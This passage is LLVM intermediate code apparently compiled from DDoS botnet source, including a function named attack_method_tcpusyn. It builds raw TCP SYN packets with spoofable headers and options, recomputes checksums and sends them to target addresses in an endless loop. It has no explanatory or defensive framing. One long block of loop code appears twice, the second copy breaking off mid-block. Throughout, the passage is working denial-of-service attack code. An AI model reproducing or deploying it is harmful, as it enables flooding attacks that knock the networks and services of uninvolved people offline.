.loopexit.loopexit:                               ; preds = %208
  br label %.loopexit.backedge

.loopexit.loopexit141:                            ; preds = %266
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %44, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit141
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %111, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %208
  %167 = phi i32 [ %225, %208 ], [ 0, %.lr.ph.split.us.preheader ]
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds i8*, i8** %8, i64 %168
  %170 = load i8*, i8** %169, align 8
  %171 = bitcast i8* %170 to %struct.iphdr*
  %172 = getelementptr inbounds i8, i8* %170, i64 20
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 2
  %174 = load i8, i8* %173, align 4
  %175 = icmp ult i8 %174, 32
  br i1 %175, label %176, label %183

; <label>:176:                                    ; preds = %.lr.ph.split.us
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = call i32 @ntohl(i32 %178) #11
  %180 = call i32 @htonl(i32 %179) #11
  %181 = getelementptr inbounds i8, i8* %170, i64 16
  %182 = bitcast i8* %181 to i32*
  store i32 %180, i32* %182, align 4
  br label %183

; <label>:183:                                    ; preds = %.lr.ph.split.us, %176
  %184 = getelementptr inbounds i8, i8* %170, i64 12
  %185 = bitcast i8* %184 to i32*
  store i32 0, i32* %185, align 4
  br i1 %113, label %186, label %189

; <label>:186:                                    ; preds = %183
  %187 = getelementptr inbounds i8, i8* %170, i64 4
  %188 = bitcast i8* %187 to i16*
  store i16 0, i16* %188, align 4
  br label %189

; <label>:189:                                    ; preds = %186, %183
  br i1 %115, label %190, label %192

; <label>:190:                                    ; preds = %189
  %191 = bitcast i8* %172 to i16*
  store i16 0, i16* %191, align 4
  br label %192

; <label>:192:                                    ; preds = %190, %189
  br i1 %117, label %193, label %196

; <label>:193:                                    ; preds = %192
  %194 = getelementptr inbounds i8, i8* %170, i64 22
  %195 = bitcast i8* %194 to i16*
  store i16 0, i16* %195, align 2
  br label %196

; <label>:196:                                    ; preds = %193, %192
  br i1 %118, label %197, label %200

; <label>:197:                                    ; preds = %196
  %198 = getelementptr inbounds i8, i8* %170, i64 24
  %199 = bitcast i8* %198 to i32*
  store i32 0, i32* %199, align 4
  br label %200

; <label>:200:                                    ; preds = %197, %196
  br i1 %119, label %201, label %204

; <label>:201:                                    ; preds = %200
  %202 = getelementptr inbounds i8, i8* %170, i64 28
  %203 = bitcast i8* %202 to i32*
  store i32 0, i32* %203, align 4
  br label %204

; <label>:204:                                    ; preds = %201, %200
  br i1 %120, label %208, label %205

; <label>:205:                                    ; preds = %204
  %206 = getelementptr inbounds i8, i8* %170, i64 38
  %207 = bitcast i8* %206 to i16*
  store i16 0, i16* %207, align 2
  br label %208

; <label>:208:                                    ; preds = %205, %204
  %209 = getelementptr inbounds i8, i8* %170, i64 10
  %210 = bitcast i8* %209 to i16*
  store i16 0, i16* %210, align 2
  %211 = bitcast i8* %170 to i16*
  %212 = call zeroext i16 @checksum_generic(i16* %211, i32 20)
  store i16 %212, i16* %210, align 2
  %213 = getelementptr inbounds i8, i8* %170, i64 36
  %214 = bitcast i8* %213 to i16*
  store i16 0, i16* %214, align 4
  %215 = call zeroext i16 @htons(i16 zeroext 40) #11
  %216 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %171, i8* nonnull %172, i16 zeroext %215, i32 40)
  store i16 %216, i16* %214, align 4
  %217 = getelementptr inbounds i8, i8* %170, i64 22
  %218 = bitcast i8* %217 to i16*
  %219 = load i16, i16* %218, align 2
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 0, i32 1
  store i16 %219, i16* %220, align 2
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 0
  %222 = bitcast %struct.sockaddr_in* %221 to %struct.sockaddr*
  %223 = call i64 @sendto(i32 %37, i8* nonnull %170, i64 60, i32 16384, %struct.sockaddr* %222, i32 16) #10
  %224 = load i32, i32* %5, align 4
  %225 = add nsw i32 %224, 1
  store i32 %225, i32* %5, align 4
  %226 = icmp slt i32 %225, %43
  br i1 %226, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %266
  %227 = phi i32 [ %283, %266 ], [ 0, %.lr.ph.split.preheader ]
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds i8*, i8** %8, i64 %228
  %230 = load i8*, i8** %229, align 8
  %231 = bitcast i8* %230 to %struct.iphdr*
  %232 = getelementptr inbounds i8, i8* %230, i64 20
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 2
  %234 = load i8, i8* %233, align 4
  %235 = icmp ult i8 %234, 32
  br i1 %235, label %236, label %243

; <label>:236:                                    ; preds = %.lr.ph.split
  %237 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 1
  %238 = load i32, i32* %237, align 4
  %239 = call i32 @ntohl(i32 %238) #11
  %240 = call i32 @htonl(i32 %239) #11
  %241 = getelementptr inbounds i8, i8* %230, i64 16
  %242 = bitcast i8* %241 to i32*
  store i32 %240, i32* %242, align 4
  br label %243

; <label>:243:                                    ; preds = %.lr.ph.split, %236
  br i1 %113, label %244, label %247

; <label>:244:                                    ; preds = %243
  %245 = getelementptr inbounds i8, i8* %230, i64 4
  %246 = bitcast i8* %245 to i16*
  store i16 0, i16* %246, align 4
  br label %247

; <label>:247:                                    ; preds = %244, %243
  br i1 %115, label %248, label %250

; <label>:248:                                    ; preds = %247
  %249 = bitcast i8* %232 to i16*
  store i16 0, i16* %249, align 4
  br label %250

; <label>:250:                                    ; preds = %248, %247
  br i1 %117, label %251, label %254

; <label>:251:                                    ; preds = %250
  %252 = getelementptr inbounds i8, i8* %230, i64 22
  %253 = bitcast i8* %252 to i16*
  store i16 0, i16* %253, align 2
  br label %254

; <label>:254:                                    ; preds = %251, %250
  br i1 %118, label %255, label %258

; <label>:255:                                    ; preds = %254
  %256 = getelementptr inbounds i8, i8* %230, i64 24
  %257 = bitcast i8* %256 to i32*
  store i32 0, i32* %257, align 4
  br label %258

; <label>:258:                                    ; preds = %255, %254
  br i1 %119, label %259, label %262

; <label>:259:                                    ; preds = %258
  %260 = getelementptr inbounds i8, i8* %230, i64 28
  %261 = bitcast i8* %260 to i32*
  store i32 0, i32* %261, align 4
  br label %262

; <label>:262:                                    ; preds = %259, %258
  br i1 %120, label %266, label %263

; <label>:263:                                    ; preds = %262
  %264 = getelementptr inbounds i8, i8* %230, i64 38
  %265 = bitcast i8* %264 to i16*
  store i16 0, i16* %265, align 2
  br label %266

; <label>:266:                                    ; preds = %262, %263
  %267 = getelementptr inbounds i8, i8* %230, i64 10
  %268 = bitcast i8* %267 to i16*
  store i16 0, i16* %268, align 2
  %269 = bitcast i8* %230 to i16*
  %270 = call zeroext i16 @checksum_generic(i16* %269, i32 20)
  store i16 %270, i16* %268, align 2
  %271 = getelementptr inbounds i8, i8* %230, i64 36
  %272 = bitcast i8* %271 to i16*
  store i16 0, i16* %272, align 4
  %273 = call zeroext i16 @htons(i16 zeroext 40) #11
  %274 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %231, i8* %232, i16 zeroext %273, i32 40)
  store i16 %274, i16* %272, align 4
  %275 = getelementptr inbounds i8, i8* %230, i64 22
  %276 = bitcast i8* %275 to i16*
  %277 = load i16, i16* %276, align 2
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0, i32 1
  store i16 %277, i16* %278, align 2
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0
  %280 = bitcast %struct.sockaddr_in* %279 to %struct.sockaddr*
  %281 = call i64 @sendto(i32 %37, i8* %230, i64 60, i32 16384, %struct.sockaddr* %280, i32 16) #10
  %282 = load i32, i32* %5, align 4
  %283 = add nsw i32 %282, 1
  store i32 %283, i32* %5, align 4
  %284 = icmp slt i32 %283, %43
  br i1 %284, label %.lr.ph.split, label %.loopexit.loopexit141

; <label>:285:                                    ; preds = %4, %109
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpusyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %285, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %109, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %64 = or i16 %63, 160
  %65 = zext i8 %0 to i64
  br i1 %45, label %.lr.ph130.split.us.preheader, label %.lr.ph130.split.preheader

.lr.ph130.split.preheader:                        ; preds = %.lr.ph130
  br label %.lr.ph130.split

.lr.ph130.split.us.preheader:                     ; preds = %.lr.ph130
  br label %.lr.ph130.split.us

.lr.ph130.split.us:                               ; preds = %.lr.ph130.split.us.preheader, %.lr.ph130.split.us
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph130.split.us ], [ 0, %.lr.ph130.split.us.preheader ]
  %66 = call noalias i8* @calloc(i64 128, i64 1) #10
  %67 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %66, i8** %67, align 8
  %68 = getelementptr inbounds i8, i8* %66, i64 20
  %69 = getelementptr inbounds i8, i8* %66, i64 40
  store i8 69, i8* %66, align 4
  %70 = getelementptr inbounds i8, i8* %66, i64 1
  store i8 %10, i8* %70, align 1
  %71 = call zeroext i16 @htons(i16 zeroext 60) #11
  %72 = getelementptr inbounds i8, i8* %66, i64 2
  %73 = bitcast i8* %72 to i16*
  store i16 %71, i16* %73, align 2
  %74 = call zeroext i16 @htons(i16 zeroext %12) #11
  %75 = getelementptr inbounds i8, i8* %66, i64 4
  %76 = bitcast i8* %75 to i16*
  store i16 %74, i16* %76, align 4
  %77 = getelementptr inbounds i8, i8* %66, i64 8
  store i8 %14, i8* %77, align 4
  %78 = getelementptr inbounds i8, i8* %66, i64 9
  store i8 6, i8* %78, align 1
  %79 = getelementptr inbounds i8, i8* %66, i64 12
  %80 = bitcast i8* %79 to i32*
  store i32 %36, i32* %80, align 4
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %82 = load i32, i32* %81, align 4
  %83 = getelementptr inbounds i8, i8* %66, i64 16
  %84 = bitcast i8* %83 to i32*
  store i32 %82, i32* %84, align 4
  %85 = call zeroext i16 @htons(i16 zeroext %18) #11
  %86 = bitcast i8* %68 to i16*
  store i16 %85, i16* %86, align 4
  %87 = call zeroext i16 @htons(i16 zeroext %20) #11
  %88 = getelementptr inbounds i8, i8* %66, i64 22
  %89 = bitcast i8* %88 to i16*
  store i16 %87, i16* %89, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %46) #11
  %91 = zext i16 %90 to i32
  %92 = getelementptr inbounds i8, i8* %66, i64 24
  %93 = bitcast i8* %92 to i32*
  store i32 %91, i32* %93, align 4
  %94 = getelementptr inbounds i8, i8* %66, i64 32
  %95 = bitcast i8* %94 to i16*
  store i16 %64, i16* %95, align 4
  %96 = getelementptr inbounds i8, i8* %66, i64 41
  store i8 2, i8* %69, align 1
  %97 = getelementptr inbounds i8, i8* %66, i64 42
  store i8 4, i8* %96, align 1
  %98 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %99 = bitcast i8* %97 to i16*
  store i16 %98, i16* %99, align 2
  %100 = getelementptr inbounds i8, i8* %66, i64 44
  %101 = getelementptr inbounds i8, i8* %66, i64 45
  store i8 4, i8* %100, align 1
  %102 = getelementptr inbounds i8, i8* %66, i64 46
  store i8 2, i8* %101, align 1
  %103 = getelementptr inbounds i8, i8* %66, i64 47
  store i8 8, i8* %102, align 1
  store i8 10, i8* %103, align 1
  %104 = getelementptr inbounds i8, i8* %66, i64 56
  %105 = getelementptr inbounds i8, i8* %66, i64 57
  store i8 1, i8* %104, align 1
  %106 = getelementptr inbounds i8, i8* %66, i64 58
  store i8 3, i8* %105, align 1
  %107 = getelementptr inbounds i8, i8* %66, i64 59
  store i8 3, i8* %106, align 1
  store i8 6, i8* %107, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %108 = icmp slt i64 %indvars.iv.next, %65
  br i1 %108, label %.lr.ph130.split.us, label %..preheader_crit_edge.loopexit

; <label>:109:                                    ; preds = %39
  %110 = call i32 @close(i32 %37) #10
  br label %285

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph130.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit142:                ; preds = %.lr.ph130.split
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit142, %..preheader_crit_edge.loopexit
  %.lcssa131.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next136, %..preheader_crit_edge.loopexit142 ]
  %.lcssa131 = trunc i64 %.lcssa131.in to i32
  store i32 %.lcssa131, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader128, %..preheader_crit_edge
  %111 = icmp eq i32 %36, -1
  %112 = and i32 %11, 65535
  %113 = icmp eq i32 %112, 65535
  %114 = and i32 %17, 65535
  %115 = icmp eq i32 %114, 65535
  %116 = and i32 %19, 65535
  %117 = icmp eq i32 %116, 65535
  %118 = icmp eq i32 %21, 65535
  %119 = icmp eq i32 %22, 65535
  %120 = icmp eq i8 %24, 0
  br label %.loopexit

.lr.ph130.split:                                  ; preds = %.lr.ph130.split.preheader, %.lr.ph130.split
  %indvars.iv135 = phi i64 [ %indvars.iv.next136, %.lr.ph130.split ], [ 0, %.lr.ph130.split.preheader ]
  %121 = call noalias i8* @calloc(i64 128, i64 1) #10
  %122 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv135
  store i8* %121, i8** %122, align 8
  %123 = getelementptr inbounds i8, i8* %121, i64 20
  %124 = getelementptr inbounds i8, i8* %121, i64 40
  store i8 69, i8* %121, align 4
  %125 = getelementptr inbounds i8, i8* %121, i64 1
  store i8 %10, i8* %125, align 1
  %126 = call zeroext i16 @htons(i16 zeroext 60) #11
  %127 = getelementptr inbounds i8, i8* %121, i64 2
  %128 = bitcast i8* %127 to i16*
  store i16 %126, i16* %128, align 2
  %129 = call zeroext i16 @htons(i16 zeroext %12) #11
  %130 = getelementptr inbounds i8, i8* %121, i64 4
  %131 = bitcast i8* %130 to i16*
  store i16 %129, i16* %131, align 4
  %132 = getelementptr inbounds i8, i8* %121, i64 8
  store i8 %14, i8* %132, align 4
  %133 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %134 = getelementptr inbounds i8, i8* %121, i64 6
  %135 = bitcast i8* %134 to i16*
  store i16 %133, i16* %135, align 2
  %136 = getelementptr inbounds i8, i8* %121, i64 9
  store i8 6, i8* %136, align 1
  %137 = getelementptr inbounds i8, i8* %121, i64 12
  %138 = bitcast i8* %137 to i32*
  store i32 %36, i32* %138, align 4
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv135, i32 1
  %140 = load i32, i32* %139, align 4
  %141 = getelementptr inbounds i8, i8* %121, i64 16
  %142 = bitcast i8* %141 to i32*
  store i32 %140, i32* %142, align 4
  %143 = call zeroext i16 @htons(i16 zeroext %18) #11
  %144 = bitcast i8* %123 to i16*
  store i16 %143, i16* %144, align 4
  %145 = call zeroext i16 @htons(i16 zeroext %20) #11
  %146 = getelementptr inbounds i8, i8* %121, i64 22
  %147 = bitcast i8* %146 to i16*
  store i16 %145, i16* %147, align 2
  %148 = call zeroext i16 @htons(i16 zeroext %46) #11
  %149 = zext i16 %148 to i32
  %150 = getelementptr inbounds i8, i8* %121, i64 24
  %151 = bitcast i8* %150 to i32*
  store i32 %149, i32* %151, align 4
  %152 = getelementptr inbounds i8, i8* %121, i64 32
  %153 = bitcast i8* %152 to i16*
  store i16 %64, i16* %153, align 4
  %154 = getelementptr inbounds i8, i8* %121, i64 41
  store i8 2, i8* %124, align 1
  %155 = getelementptr inbounds i8, i8* %121, i64 42
  store i8 4, i8* %154, align 1
  %156 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %157 = bitcast i8* %155 to i16*
  store i16 %156, i16* %157, align 2
  %158 = getelementptr inbounds i8, i8* %121, i64 44
  %159 = getelementptr inbounds i8, i8* %121, i64 45
  store i8 4, i8* %158, align 1
  %160 = getelementptr inbounds i8, i8* %121, i64 46
  store i8 2, i8* %159, align 1
  %161 = getelementptr inbounds i8, i8* %121, i64 47
  store i8 8, i8* %160, align 1
  store i8 10, i8* %161, align 1
  %162 = getelementptr inbounds i8, i8* %121, i64 56
  %163 = getelementptr inbounds i8, i8* %121, i64 57
  store i8 1, i8* %162, align 1
  %164 = getelementptr inbounds i8, i8* %121, i64 58
  store i8 3, i8* %163, align 1
  %165 = getelementptr inbounds i8, i8* %121, i64 59
  store i8 3, i8* %164, align 1
  store i8 6, i8* %165, align 1
  %indvars.iv.next136 = add nsw i64 %indvars.iv135, 1
  %166 = icmp slt i64 %indvars.iv.next136, %65
  br i1 %166, label %.lr.ph130.split, label %..preheader_crit_edge.loopexit142

.loopexit.loopexit:                               ; preds = %208
  br label %.loopexit.backedge

.loopexit.loopexit141:                            ; preds = %266
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %44, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit141
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %111, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %208
  %167 = phi i32 [ %225, %208 ], [ 0, %.lr.ph.split.us.preheader ]
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds i8*, i8** %8, i64 %168
  %170 = load i8*, i8** %169, align 8
  %171 = bitcast i8* %170 to %struct.iphdr*
  %172 = getelementptr inbounds i8, i8* %170, i64 20
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 2
  %174 = load i8, i8* %173, align 4
  %175 = icmp ult i8 %174, 32
  br i1 %175, label %176, label %183

; <label>:176:                                    ; preds = %.lr.ph.split.us
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = call i32 @ntohl(i32 %178) #11
  %180 = call i32 @htonl(i32 %179) #11
  %181 = getelementptr inbounds i8, i8* %170, i64 16
  %182 = bitcast i8* %181 to i32*
  store i32 %180, i32* %182, align 4
  br label %183

; <label>:183:                                    ; preds = %.lr.ph.split.us, %176
  %184 = getelementptr inbounds i8, i8* %170, i64 12
  %185 = bitcast i8* %184 to i32*
  store i32 0, i32* %185, align 4
  br i1 %113, label %186, label %189

; <label>:186:                                    ; preds = %183
  %187 = getelementptr inbounds i8, i8* %170, i64 4
  %188 = bitcast i8* %187 to i16*
  store i16 0, i16* %188, align 4
  br label %189

; <label>:189:                                    ; preds = %186, %183
  br i1 %115, label %190, label %192

; <label>:190:                                    ; preds = %189
  %191 = bitcast i8* %172 to i16*
  store i16 0, i16* %191, align 4
  br label %192

; <label>:192:                                    ; preds = %190, %189
  br i1 %117, label %193, label %196

; <label>:193:                                    ; preds = %192
  %194 = getelementptr inbounds i8, i8* %170, i64 22
  %195 = bitcast i8* %194 to i16*
  store i16 0, i16* %195, align 2
  br label %196

; <label>:196:                                    ; preds = %193, %192
  br i1 %118, label %197, label %200

; <label>:197:                                    ; preds = %196
  %198 = getelementptr inbounds i8, i8* %170, i64 24
  %199 = bitcast i8* %198 to i32*
  store i32 0, i32* %199, align 4
  br label %200

; <label>:200:                                    ; preds = %197, %196
  br i1 %119, label %201, label %204

; <label>:201:                                    ; preds = %200
  %202 = getelementptr inbounds i8, i8* %170, i64 28
  %203 = bitcast i8* %202 to i32*
  store i32 0, i32* %203, align 4
  br label %204

; <label>:204:                                    ; preds = %201, %200
  br i1 %120, label %208, label %205

; <label>:205:                                    ; preds = %204
  %206 = getelementptr inbounds i8, i8* %170, i64 38
  %207 = bitcast i8* %206 to i16*
  store i16 0, i16* %207, align 2
  br label %208

; <label>:208:                                    ; preds = %205, %204
  %209 = getelementptr inbounds i8, i8* %170, i64 10
  %210 = bitcast i8* %209 to i16*
  store i16 0, i16* %210, align 2
  %211 = bitcast i8* %170 to i16*
  %212 = call zeroext i16 @checksum_generic(i16* %211, i32 20)
  store i16 %212, i16* %210, align 2
  %213 = getelementptr inbounds i8, i8* %170, i64 36
  %214 = bitcast i8* %213 to i16*
  store i16 0, i16* %214, align 4
  %215 = call zeroext i16 @htons(i16 zeroext 40) #11
  %216 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %171, i8* nonnull %172, i16 zeroext %215, i32 40)
  store i16 %216, i16* %214, align 4
  %217 = getelementptr inbounds i8, i8* %170, i64 22
  %218 = bitcast i8* %217 to i16*
  %219 = load i16, i16* %218, align 2
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 0, i32 1
  store i16 %219, i16* %220, align 2
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 0
  %222 = bitcast %struct.sockaddr_in* %221 to %struct.sockaddr*
  %223 = call i64 @sendto(i32 %37, i8* nonnull %170, i64 60, i32 16384, %struct.sockaddr* %222, i32 16) #10
  %224 = load i32, i32* %5, align 4
  %225 = add nsw i32 %224, 1
  store i32 %225, i32* %5, align 4
  %226 = icmp slt i32 %225, %43
  br i1 %226, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %266
  %227 = phi i32 [ %283, %266 ], [ 0, %.lr.ph.split.preheader ]
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds i8*, i8** %8, i64 %228
  %230 = load i8*, i8** %229, align 8
  %231 = bitcast i8* %230 to %struct.iphdr*
  %232 = getelementptr inbounds i8, i8* %230, i64 20
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 2
  %234 = load i8, i8* %233, align 4
  %235 = icmp ult i8 %234, 32
  br i1 %235, label %236, label %243

; <label>:236:                                    ; preds = %.lr.ph.split
  %237 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 1
  %238 = load i32, i32* %237, align 4
  %239 = call i32 @ntohl(i32 %238) #11
  %240 = call i32 @htonl(i32 %239) #11
  %241 = getelementptr inbounds i8, i8* %230, i64 16
  %242 = bitcast i8* %241 to i32*
  store i32 %240, i32* %242, align 4
  br label %243

; <label>:243:                                    ; preds = %.lr.ph.split, %236
  br i1 %113, label %244, label %247

; <label>:244:                                    ; preds = %243
  %245 = getelementptr inbounds i8, i8* %230, i64 4
  %246 = bitcast i8* %245 to i16*
  store i16 0, i16* %246, align 4
  br label %247

; <label>:247:                                    ; preds = %244, %243
  br i1 %115, label %248, label %250

; <label>:248:                                    ; preds = %247
  %249 = bitcast i8* %232 to i16*
  store i16 0, i16* %249, align 4
  br label %250

; <label>:250:                                    ; preds = %248, %247
  br i1 %117, label %251, label %254

; <label>:251:                                    ; preds = %250
  %252 = getelementptr inbounds i8, i8* %230, i64 22
  %253 = bitcast i8* %252 to i16*
  store i16 0, i16* %253, align 2
  br label %254

; <label>:254:                                    ; preds = %251, %250
  br i1 %118, label %255, label %258

; <label>:255:                                    ; preds = %254
  %256 = getelementptr inbounds i8, i8* %230, i64 24
  %257 = bitcast i8* %256 to i32*
  store i32 0, i32* %257, align 4
  br label %258

; <label>:258:                                    ; preds = %255, %254
  br i1 %119, label %259, label %262

; <label>:259:                                    ; preds = %258
  %260 = getelementptr inbounds i8, i8* %230, i64 28
  %261 = bitcast i8* %260 to i32*
  store i32 0, i32* %261, align 4
  br label %262

; <label>:262:                                    ; preds = %259, %258
  br i1 %120, label %266, label %263

; <label>:263:                                    ; preds = %262
  %264 = getelementptr inbounds i8, i8* %230, i64 38
  %265 = bitcast i8* %264 to i16*
  store i16 0, i16* %265, align 2
  br label %266

; <label>:266:                                    ; preds = %262, %263
  %267 = getelementptr inbounds i8, i8* %230, i64 10
  %268 = bitcast i8* %267 to i16*
  store i16 0, i16* %268, align 2
  %269 = bitcast i8* %230 to i16*
  %270 = call zeroext i16 @checksum_generic(i16* %269, i32 20)
  store i16 %270, i16* %268, align 2
  %271 = getelementptr inbounds i8, i8* %230, i64 36
  %272 = bitcast i8* %271 to i16*
  store i16 0, i16* %272, align 4
  %273 = call zeroext i16 @htons(i16 zeroext 40) #11
  %274 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %231, i8* %232, i16 zeroext %273, i32 40)
  store i16 %274, i16* %272, align 4
  %275 = getelementptr inbounds i8, i8* %230, i64 22
  %276 = bitcast i8* %275 to i16*
  %277 = load i16, i16* %276, align 2
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0, i32 1
  store i16 %277, i16* %278, align 2
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0
  %280 = bitcast %struct.sockaddr_in* %279 to %struct.sockaddr*
  %281 = call i64 @sendto(i32 %37, i8* %230, i64 60, i32 16384, %struct.sockaddr* %280, i32 16) #10
  %282 = load i32, i32* %5, align 4
  %283 = add nsw i32 %282, 1
  store i32 %283, i32* %5, align 4
